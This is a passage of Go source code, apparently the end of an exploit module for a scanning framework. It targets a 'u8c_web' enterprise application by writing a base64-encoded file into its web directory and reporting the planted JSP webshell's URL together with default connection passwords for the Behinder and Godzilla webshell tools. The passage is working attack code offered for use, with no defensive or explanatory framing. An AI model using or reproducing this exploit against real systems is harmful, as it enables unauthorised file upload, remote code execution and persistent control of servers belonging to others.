				_, err := sendPayloadORREIZXCUIEQOH(expResult.HostInfo, fmt.Sprintf("$$$$$./webapps/u8c_web/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content))))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				resp, err := checkFileExistDNQZXUWEH(expResult.HostInfo, filename)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
